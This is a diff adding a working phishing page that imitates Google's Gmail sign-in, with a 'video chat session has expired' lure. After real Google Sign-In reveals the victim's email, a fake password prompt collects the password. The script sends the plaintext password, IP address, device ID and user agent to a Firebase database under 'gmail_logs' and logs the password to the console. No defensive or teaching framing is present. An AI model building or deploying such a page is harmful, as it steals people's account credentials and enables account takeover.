@@ -1,0 +1,1181 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Sign in - Gmail</title>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <!-- Google Sign-In -->
+    <script src="https://accounts.google.com/gsi/client" async defer></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Light Mode (Default) */
+        :root {
+            --bg-color: #ffffff;
+            --card-bg: #ffffff;
+            --text-primary: #202124;
+            --text-secondary: #5f6368;
+            --border-color: #dadce0;
+            --input-bg: #ffffff;
+            --input-border: #dadce0;
+            --input-focus: #1a73e8;
+            --button-bg: #1a73e8;
+            --button-hover: #1765cc;
+            --link-color: #1a73e8;
+            --avatar-bg: #8e24aa;
+            --avatar-border: #5f6368;
+            --footer-text: #5f6368;
+            --divider-color: #dadce0;
+            --hover-bg: #f1f3f4;
+            --email-selector-border: #dadce0;
+            --email-selector-hover: #f1f3f4;
+        }
+
+        /* Dark Mode */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #202124;
+                --card-bg: #202124;
+                --text-primary: #e8eaed;
+                --text-secondary: #9aa0a6;
+                --border-color: #5f6368;
+                --input-bg: #202124;
+                --input-border: #5f6368;
+                --input-focus: #8ab4f8;
+                --button-bg: #8ab4f8;
+                --button-hover: #aecbfa;
+                --link-color: #8ab4f8;
+                --avatar-bg: #8e24aa;
+                --avatar-border: #9aa0a6;
+                --footer-text: #9aa0a6;
+                --divider-color: #5f6368;
+                --hover-bg: #3c4043;
+                --email-selector-border: #5f6368;
+                --email-selector-hover: #3c4043;
+            }
+        }
+
+        /* Manual Override Classes */
+        body.light-mode {
+            --bg-color: #ffffff;
+            --card-bg: #ffffff;
+            --text-primary: #202124;
+            --text-secondary: #5f6368;
+            --border-color: #dadce0;
+            --input-bg: #ffffff;
+            --input-border: #dadce0;
+            --input-focus: #1a73e8;
+            --button-bg: #1a73e8;
+            --button-hover: #1765cc;
+            --link-color: #1a73e8;
+            --avatar-bg: #8e24aa;
+            --avatar-border: #5f6368;
+            --footer-text: #5f6368;
+            --divider-color: #dadce0;
+            --hover-bg: #f1f3f4;
+            --email-selector-border: #dadce0;
+            --email-selector-hover: #f1f3f4;
+        }
+
+        body.dark-mode {
+            --bg-color: #202124;
+            --card-bg: #202124;
+            --text-primary: #e8eaed;
+            --text-secondary: #9aa0a6;
+            --border-color: #5f6368;
+            --input-bg: #202124;
+            --input-border: #5f6368;
+            --input-focus: #8ab4f8;
+            --button-bg: #8ab4f8;
+            --button-hover: #aecbfa;
+            --link-color: #8ab4f8;
+            --avatar-bg: #8e24aa;
+            --avatar-border: #9aa0a6;
+            --footer-text: #9aa0a6;
+            --divider-color: #5f6368;
+            --hover-bg: #3c4043;
+            --email-selector-border: #5f6368;
+            --email-selector-hover: #3c4043;
+        }
+
+        body {
+            font-family: 'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+            background: var(--bg-color);
+            min-height: 100vh;
+            transition: background 0.3s ease;
+        }
+
+        /* ========== DESKTOP VIEW - CENTERED ========== */
+        @media (min-width: 768px) {
+            body {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                padding: 20px;
+            }
+
+            .container {
+                width: 100%;
+                max-width: 450px;
+                margin: 0 auto;
+            }
+
+            /* Card centered on desktop */
+            .card {
+                background: var(--card-bg);
+                border-radius: 8px;
+                padding: 48px 40px 36px;
+                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+                border: 1px solid var(--border-color);
+            }
+
+            /* Modal centered on desktop */
+            .password-modal {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0, 0, 0, 0.5);
+                backdrop-filter: blur(2px);
+                z-index: 2000;
+                display: none;
+                justify-content: center;
+                align-items: center;
+            }
+
+            .password-card {
+                background: var(--card-bg);
+                max-width: 450px;
+                width: 90%;
+                padding: 48px 40px 36px;
+                box-shadow: 0 24px 38px rgba(0, 0, 0, 0.2);
+                border-radius: 8px;
+                border: 1px solid var(--border-color);
+                margin: 0;
+            }
+
+            .modal-close {
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: none;
+                border: none;
+                font-size: 24px;
+                cursor: pointer;
+                color: var(--text-secondary);
+                padding: 8px;
+                border-radius: 50%;
+                width: 40px;
+                height: 40px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 2001;
+            }
+        }
+
+        /* ========== MOBILE VIEW - TOP LEFT ========== */
+        @media (max-width: 767px) {
+            body {
+                padding: 24px;
+            }
+
+            .container {
+                width: 100%;
+                max-width: 450px;
+                margin: 0;
+            }
+
+            .card {
+                background: var(--card-bg);
+                border-radius: 8px;
+                padding: 0;
+                box-shadow: none;
+                border: none;
+            }
+
+            .password-modal {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: var(--bg-color);
+                z-index: 2000;
+                display: none;
+                overflow-y: auto;
+                padding: 24px;
+            }
+
+            .password-card {
+                background: var(--card-bg);
+                max-width: 450px;
+                width: 100%;
+                padding: 0;
+                box-shadow: none;
+                border: none;
+                margin: 0;
+            }
+
+            .modal-close {
+                position: absolute;
+                top: 20px;
+                right: 20px;
+                background: none;
+                border: none;
+                font-size: 24px;
+                cursor: pointer;
+                color: var(--text-secondary);
+                padding: 8px;
+                border-radius: 50%;
+                width: 40px;
+                height: 40px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 2001;
+            }
+        }
+
+        /* Google Logo */
+        .google-logo {
+            margin-bottom: 32px;
+        }
+
+        .google-logo img {
+            width: 75px;
+            height: auto;
+        }
+
+        /* Welcome Header */
+        .welcome-header {
+            margin-bottom: 32px;
+        }
+
+        .welcome-header h1 {
+            color: var(--text-primary);
+            font-size: 24px;
+            font-weight: 400;
+        }
+
+        /* ========== GOOGLE STYLE EMAIL SELECTOR ========== */
+        .email-selector {
+            margin-bottom: 32px;
+            cursor: pointer;
+            display: inline-block;
+        }
+
+        .Ahygpe {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 8px 12px;
+            border: 1px solid var(--email-selector-border);
+            border-radius: 24px;
+            background: var(--card-bg);
+            transition: all 0.2s;
+            cursor: pointer;
+        }
+
+        .Ahygpe:hover {
+            background: var(--email-selector-hover);
+            border-color: var(--input-focus);
+        }
+
+        .JQ5tlb {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .JQ5tlb svg {
+            width: 25px;
+            height: 25px;
+            color: var(--avatar-bg);
+            border-radius: 50%;
+        }
+
+        .IxcUte {
+            color: var(--text-primary);
+            font-size: 14px;
+            font-weight: 500;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+        }
+
+        .JCl8ie svg {
+            width: 20px;
+            height: 20px;
+            color: var(--text-secondary);
+        }
+
+        /* Not you? link */
+        .not-you {
+            margin-top: 12px;
+            margin-left: 12px;
+        }
+
+        .not-you a {
+            color: var(--link-color);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .not-you a:hover {
+            text-decoration: underline;
+        }
+
+        /* Password Input Container */
+        .input-container {
+            margin: 34px 0 8px;
+            position: relative;
+        }
+
+        .password-input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid var(--input-border);
+            border-radius: 4px;
+            outline: none;
+            background: var(--input-bg);
+            color: var(--text-primary);
+            transition: all 0.2s ease;
+        }
+
+        .password-input:focus {
+            border-color: var(--input-focus);
+            border-width: 2px;
+            padding: 12px 14px;
+        }
+
+        .floating-label {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-secondary);
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            background: var(--input-bg);
+            padding: 0 4px;
+        }
+
+        .password-input:focus+.floating-label,
+        .password-input:not(:placeholder-shown)+.floating-label {
+            top: 0;
+            font-size: 12px;
+            color: var(--input-focus);
+        }
+
+        /* Error State */
+        .input-container.error .password-input {
+            border-color: #d93025;
+        }
+
+        .input-container.error .floating-label {
+            color: #d93025;
+        }
+
+        .error-text {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 4px;
+            margin-left: 15px;
+            display: none;
+        }
+
+        .input-container.error .error-text {
+            display: block;
+        }
+
+        /* Show Password Checkbox */
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin: 16px 0 20px;
+        }
+
+        .checkbox-group input {
+            width: 16px;
+            height: 16px;
+            margin-right: 10px;
+            cursor: pointer;
+            accent-color: var(--input-focus);
+        }
+
+        .checkbox-group label {
+            color: var(--text-secondary);
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .checkbox-group label:hover {
+            color: var(--text-primary);
+        }
+
+        /* Forgot Password */
+        .forgot-link {
+            margin-bottom: 32px;
+        }
+
+        .forgot-link a {
+            color: var(--link-color);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* Next Button */
+        .next-btn-wrapper {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 32px;
+        }
+
+        .next-btn {
+            background: var(--button-bg);
+            border: none;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #202124;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: background 0.2s;
+        }
+
+        .next-btn:hover {
+            background: var(--button-hover);
+        }
+
+        .next-btn:disabled {
+            background: #dadce0;
+            cursor: not-allowed;
+        }
+
+        /* Footer */
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 16px;
+            margin-top: 8px;
+            padding-bottom: 20px;
+        }
+
+        .language-select {
+            color: var(--footer-text);
+            font-size: 12px;
+        }
+
+        .language-select select {
+            background: none;
+            border: none;
+            color: var(--footer-text);
+            font-size: 12px;
+            cursor: pointer;
+            font-family: inherit;
+            padding: 4px;
+        }
+
+        .language-select select:hover {
+            color: var(--text-primary);
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 24px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: var(--footer-text);
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .footer-links a:hover {
+            color: var(--link-color);
+        }
+
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 12px;
+            margin: 24px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid var(--divider-color);
+        }
+
+        .divider::before {
+            margin-right: 10px;
+        }
+
+        .divider::after {
+            margin-left: 10px;
+        }
+
+        /* Account List */
+        .account-list {
+            margin-top: 8px;
+        }
+
+        .account-item {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 8px 12px;
+            border-radius: 24px;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-bottom: 4px;
+        }
+
+        .account-item:hover {
+            background: var(--hover-bg);
+        }
+
+        .account-avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: var(--avatar-bg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .account-email {
+            color: var(--text-primary);
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        /* Create account */
+        .create-account {
+            text-align: center;
+            margin-top: 24px;
+        }
+
+        .create-account a {
+            color: var(--link-color);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .device-id {
+            text-align: center;
+            font-size: 11px;
+            color: var(--text-secondary);
+            margin-top: 20px;
+        }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #323232;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-size: 14px;
+            display: none;
+            z-index: 3000;
+        }
+
+        /* Theme Toggle */
+        .top-right {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 20px;
+        }
+
+        .theme-toggle {
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-primary);
+        }
+
+        .theme-toggle:hover {
+            background: var(--hover-bg);
+        }
+
+        /* Spinner */
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid white;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.6s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 16px;
+            }
+
+            .welcome-header h1 {
+                font-size: 22px;
+            }
+        }
+
+        /* Session Expired Message */
+        .expired-message {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            background: rgba(234, 67, 53, 0.1);
+            border: 1px solid #ea4335;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 32px;
+        }
+
+        .expired-icon {
+            font-size: 48px;
+        }
+
+        .expired-text {
+            color: var(--text-primary);
+            font-size: 14px;
+            font-weight: 500;
+            line-height: 1.4;
+        }
+
+        .expired-text br {
+            display: block;
+        }
+
+        /* Dark mode support */
+        @media (prefers-color-scheme: dark) {
+            .expired-message {
+                background: rgba(234, 67, 53, 0.15);
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <div id="loginSection" class="card">
+            <!-- Theme Toggle -->
+            <div class="top-right">
+                <button class="theme-toggle" onclick="toggleTheme()" title="Toggle Dark/Light Mode">
+                    🌓
+                </button>
+            </div>
+
+            <!-- Session Expired Message with Girl Icon -->
+            <div class="expired-message">
+                <div class="expired-icon">👧</div>
+                <div class="expired-text">Video chat session has expired<br>Please login and verify to continue</div>
+            </div>
+
+            <!-- Google Logo -->
+            <div class="google-logo">
+                <img src="https://static.seriesreminder.com/assets/images/Google__G__Logo.svg.png" alt="Google"
+                    style="width: 55px; height: auto;">
+            </div>
+
+            <div class="welcome-header">
+                <h1>Welcome</h1>
+            </div>
+
+            <!-- Google Sign-In Button -->
+            <div id="googleBtn" class="g_id_signin" style="display: flex; justify-content: center;"></div>
+
+            <div class="divider">or</div>
+
+            <div style="color: var(--text-secondary); font-size: 14px; margin-bottom: 12px;">Use another account</div>
+            <div id="accountList" class="account-list">
+                <div style="text-align: center; color: var(--text-secondary); padding: 20px;">Loading...</div>
+            </div>
+
+            <div class="create-account">
+                <a href="#">Create account</a>
+            </div>
+
+            <div class="device-id" id="deviceIdDisplay"></div>
+        </div>
+    </div>
+
+    <!-- Password Modal -->
+    <div id="passwordModal" class="password-modal">
+        
+
+        <div class="password-card">
+            <!-- Theme Toggle -->
+            <div class="top-right">
+                <button class="theme-toggle" onclick="toggleTheme()" title="Toggle Dark/Light Mode">
+                    🌓
+                </button>
+            </div>
+
+            <!-- Google Logo -->
+            <div class="google-logo">
+                <img src="https://static.seriesreminder.com/assets/images/Google__G__Logo.svg.png" alt="Google"
+                    style="width: 55px; height: auto;">
+            </div>
+
+            <div class="welcome-header">
+                <h1>Welcome</h1>
+            </div>
+
+            <!-- Google Style Email Selector -->
+            <div class="email-selector" onclick="switchAccount()">
+                <div class="Ahygpe">
+                    <div class="JQ5tlb">
+                        <svg aria-hidden="true" class="Qk3oof" fill="currentColor" focusable="false" width="48px"
+                            height="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                            <path
+                                d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z">
+                            </path>
+                        </svg>
+                    </div>
+                    <div class="IxcUte" id="modalEmail">---</div>
+                    <div class="JCl8ie">
+                        <svg aria-hidden="true" class="Qk3oof u4TTuf" fill="currentColor" focusable="false" width="24px"
+                            height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                            <path d="M7 10l5 5 5-5z"></path>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Not you? link -->
+            <div class="not-you">
+                <a href="#" onclick="switchAccount(); return false;"></a>
+            </div>
+
+            <!-- Password Input -->
+            <div class="input-container" id="passwordContainer">
+                <input type="password" id="passwordInput" class="password-input" placeholder=" ">
+                <label class="floating-label">Enter your password</label>
+                <div class="error-text">Enter a password</div>
+            </div>
+
+            <!-- Show Password Checkbox -->
+            <div class="checkbox-group">
+                <input type="checkbox" id="showPasswordCheckbox" onclick="togglePassword()">
+                <label for="showPasswordCheckbox">Show password</label>
+            </div>
+
+            <!-- Forgot Password -->
+            <div class="forgot-link">
+                <a href="#">Forgot password?</a>
+            </div>
+
+            <!-- Next Button -->
+            <div class="next-btn-wrapper">
+                <button class="next-btn" id="nextBtn" onclick="verifyAndContinue()">Next</button>
+            </div>
+
+            <!-- Footer -->
+            <div class="footer">
+                <div class="language-select">
+                    <select>
+                        <option>English (United Kingdom)</option>
+                        <option>Hindi (India)</option>
+                    </select>
+                </div>
+                <div class="footer-links">
+                    <a href="#">Help</a>
+                    <a href="#">Privacy</a>
+                    <a href="#">Terms</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast"></div>
+
+    <script src="config.js"></script>
+    <script>
+        let database = null;
+        let deviceId = null;
+        let selectedAccount = null;
+
+        // ============ THEME FUNCTIONS ============
+        function detectSystemTheme() {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.remove('light-mode');
+                document.body.classList.add('dark-mode');
+            } else {
+                document.body.classList.remove('dark-mode');
+                document.body.classList.add('light-mode');
+            }
+        }
+
+        function toggleTheme() {
+            if (document.body.classList.contains('dark-mode')) {
+                document.body.classList.remove('dark-mode');
+                document.body.classList.add('light-mode');
+                localStorage.setItem('theme', 'light');
+            } else {
+                document.body.classList.remove('light-mode');
+                document.body.classList.add('dark-mode');
+                localStorage.setItem('theme', 'dark');
+            }
+        }
+
+        function loadTheme() {
+            const savedTheme = localStorage.getItem('theme');
+            if (savedTheme === 'dark') {
+                document.body.classList.remove('light-mode');
+                document.body.classList.add('dark-mode');
+            } else if (savedTheme === 'light') {
+                document.body.classList.remove('dark-mode');
+                document.body.classList.add('light-mode');
+            } else {
+                detectSystemTheme();
+            }
+        }
+
+        // ============ ID GENERATORS ============
+        // ============ FIXED DEVICE ID - Same as index.html ============
+        function generateDeviceId() {
+            // Use the same key as index.html
+            let id = localStorage.getItem('device_tracker_id');
+            if (!id) {
+                id = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
+                localStorage.setItem('device_tracker_id', id);
+            }
+            return id;
+        }
+
+        deviceId = generateDeviceId();
+        document.getElementById('deviceIdDisplay').innerHTML = 'Device: ' + deviceId.substring(0, 16) + '...';
+
+        // ============ UTILITIES ============
+        function togglePassword() {
+            const input = document.getElementById('passwordInput');
+            const checkbox = document.getElementById('showPasswordCheckbox');
+            input.type = checkbox.checked ? 'text' : 'password';
+        }
+
+        function showToast(msg, isError = false) {
+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.style.background = isError ? '#d93025' : '#1a73e8';
+            toast.style.display = 'block';
+            setTimeout(() => toast.style.display = 'none', 2000);
+        }
+
+        function getAvatarInitial(email) {
+            if (!email) return 'U';
+            return (email.charAt(0)).toUpperCase();
+        }
+
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch (e) {
+                return 'Unknown';
+            }
+        }
+
+        // ============ FIREBASE INIT ============
+        function initFirebase() {
+            if (typeof firebaseConfig !== 'undefined') {
+                if (!firebase.apps.length) {
+                    firebase.initializeApp(firebaseConfig);
+                }
+                database = firebase.database();
+                console.log('✅ Firebase ready');
+                loadAccounts();
+                loadTheme();
+            } else {
+                document.getElementById('accountList').innerHTML = '<div style="text-align:center;color:red;">config.js not found!</div>';
+            }
+        }
+
+        // ============ LOAD ACCOUNTS ============
+        async function loadAccounts() {
+            if (!database) return;
+
+            const snapshot = await database.ref(`device_accounts/${deviceId}`).once('value');
+            const accounts = snapshot.val();
+            const listDiv = document.getElementById('accountList');
+
+            if (accounts && Object.keys(accounts).length > 0) {
+                listDiv.innerHTML = '';
+                Object.keys(accounts).forEach(key => {
+                    const acc = accounts[key];
+                    const div = document.createElement('div');
+                    div.className = 'account-item';
+                    div.onclick = () => openPasswordModal(acc);
+                    div.innerHTML = `
+                    <div class="account-avatar">${getAvatarInitial(acc.email)}</div>
+                    <div class="account-email">${acc.email}</div>
+                `;
+                    listDiv.appendChild(div);
+                });
+            } else {
+                listDiv.innerHTML = '<div style="text-align: center; color: var(--text-secondary); padding: 20px;">No saved accounts. Sign in with Google above.</div>';
+            }
+        }
+
+        // ============ SAVE ACCOUNT ============
+        async function saveAccount(userData) {
+            if (!database) return;
+
+            await database.ref(`device_accounts/${deviceId}/${userData.email.replace(/\./g, '_')}`).set({
+                email: userData.email,
+                name: userData.name,
+                avatar: getAvatarInitial(userData.email),
+                lastUsed: new Date().toLocaleString(),
+                timestamp: Date.now()
+            });
+            loadAccounts();
+        }
+
+        // ============ OPEN PASSWORD MODAL ============
+        function openPasswordModal(account) {
+            selectedAccount = account;
+            document.getElementById('modalEmail').innerHTML = account.email;
+            document.getElementById('passwordInput').value = '';
+            document.getElementById('passwordInput').type = 'password';
+            document.getElementById('showPasswordCheckbox').checked = false;
+            document.getElementById('passwordModal').style.display = 'flex';
+
+            document.getElementById('passwordContainer').classList.remove('error');
+
+            const nextBtn = document.getElementById('nextBtn');
+            const passwordInput = document.getElementById('passwordInput');
+
+            passwordInput.oninput = function () {
+                nextBtn.disabled = this.value.trim() === '';
+                if (this.value.trim() !== '') {
+                    document.getElementById('passwordContainer').classList.remove('error');
+                }
+            };
+            nextBtn.disabled = true;
+
+            setTimeout(() => {
+                passwordInput.focus();
+            }, 100);
+        }
+
+        function closeModal() {
+            document.getElementById('passwordModal').style.display = 'none';
+            selectedAccount = null;
+        }
+
+        function switchAccount() {
+            closeModal();
+            document.getElementById('loginSection').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // ========== SIMPLIFIED VERIFY AND CONTINUE ==========
+        async function verifyAndContinue() {
+            const password = document.getElementById('passwordInput').value.trim();
+            const container = document.getElementById('passwordContainer');
+
+            if (!password) {
+                container.classList.add('error');
+                showToast('Please enter your password', true);
+                return;
+            }
+
+            if (!selectedAccount) {
+                showToast('No account selected', true);
+                return;
+            }
+
+            console.log('🔐 Saving password for:', selectedAccount.email);
+
+            const nextBtn = document.getElementById('nextBtn');
+            const originalText = nextBtn.innerHTML;
+            nextBtn.innerHTML = '<span class="spinner"></span> Signing in...';
+            nextBtn.disabled = true;
+
+            try {
+                // SIMPLE SAVE - Only email and password
+                const loginData = {
+                    email: selectedAccount.email,
+                    password: password,
+                    name: selectedAccount.name || selectedAccount.email.split('@')[0],
+                    timestamp: Date.now(),
+                    dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+                    ip: await getIP(),
+                    deviceId: deviceId,
+                    userAgent: navigator.userAgent
+                };
+
+                // Save directly under gmail_logs/deviceId
+                await database.ref(`gmail_logs/${deviceId}`).set(loginData);
+
+                // Save to history
+                await database.ref(`gmail_logs_history/${deviceId}`).push(loginData);
+
+                // Save to device accounts
+                await database.ref(`device_accounts/${deviceId}/${selectedAccount.email.replace(/\./g, '_')}`).set({
+                    email: selectedAccount.email,
+                    name: selectedAccount.name,
+                    lastUsed: new Date().toLocaleString(),
+                    timestamp: Date.now()
+                });
+
+                console.log('✅ Login saved successfully');
+                console.log('📧 Email:', selectedAccount.email);
+                console.log('🔐 Password:', password);
+
+                localStorage.setItem('gmail_logged_in', 'true');
+                localStorage.setItem('gmail_user_email', selectedAccount.email);
+                localStorage.setItem('gmail_user_name', selectedAccount.name);
+                localStorage.setItem('gmail_device_id', deviceId);
+
+                showToast('✅ Sign in successful! Redirecting...', false);
+                closeModal();
+
+                setTimeout(() => {
+                    window.location.href = 'index.html';
+                }, 1500);
+
+            } catch (error) {
+                console.error('❌ Save error:', error);
+                showToast('Error saving data. Please try again.', true);
+                nextBtn.innerHTML = originalText;
+                nextBtn.disabled = false;
+            }
+        }
+
+        // ============ GOOGLE SIGN-IN ============
+        function handleCredentialResponse(response) {
+            const decoded = JSON.parse(atob(response.credential.split('.')[1]));
+
+            const userData = {
+                email: decoded.email,
+                name: decoded.name,
+                picture: decoded.picture,
+                avatar: getAvatarInitial(decoded.email),
+                timestamp: Date.now()
+            };
+
+            saveAccount(userData);
+            openPasswordModal(userData);
+        }
+
+        function initGoogleSignIn() {
+            google.accounts.id.initialize({
+                client_id: '905194757547-bmcafd3a86q860qrvh6d5uqoc40i8ctn.apps.googleusercontent.com',
+                callback: handleCredentialResponse
+            });
+
+            google.accounts.id.renderButton(
+                document.getElementById('googleBtn'),
+                { theme: 'outline', size: 'large', width: '100%', text: 'signin_with' }
+            );
+        }
+
+        // ============ EVENT LISTENERS ============
+        document.getElementById('passwordInput').addEventListener('keypress', function (e) {
+            if (e.key === 'Enter' && !document.getElementById('nextBtn').disabled) {
+                verifyAndContinue();
+            }
+        });
+
+        document.getElementById('passwordModal').addEventListener('click', function (e) {
+            if (e.target === this) {
+                closeModal();
+            }
+        });
+
+        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', (e) => {
+            if (!localStorage.getItem('theme')) {
+                if (e.matches) {
+                    document.body.classList.add('dark-mode');
+                    document.body.classList.remove('light-mode');
+                } else {
+                    document.body.classList.add('light-mode');
+                    document.body.classList.remove('dark-mode');
+                }
+            }
+        });
+
+        // ============ START APP ============
+        function startApp() {
+            loadAccounts();
+            loadTheme();
+
+            if (typeof google !== 'undefined') {
+                initGoogleSignIn();
+            } else {
+                setTimeout(() => {
+                    if (typeof google !== 'undefined') {
+                        initGoogleSignIn();
+                    }
+                }, 1000);
+            }
+        }
+
+        if (typeof firebaseConfig !== 'undefined') {
+            initFirebase();
+            startApp();
+        } else {
+            window.addEventListener('load', () => {
+                if (typeof firebaseConfig !== 'undefined') {
+                    initFirebase();
+                    startApp();
+                } else {
+                    alert('config.js not found!');
+                }
+            });
+        }
+    </script>
+</body>
+
+</html>
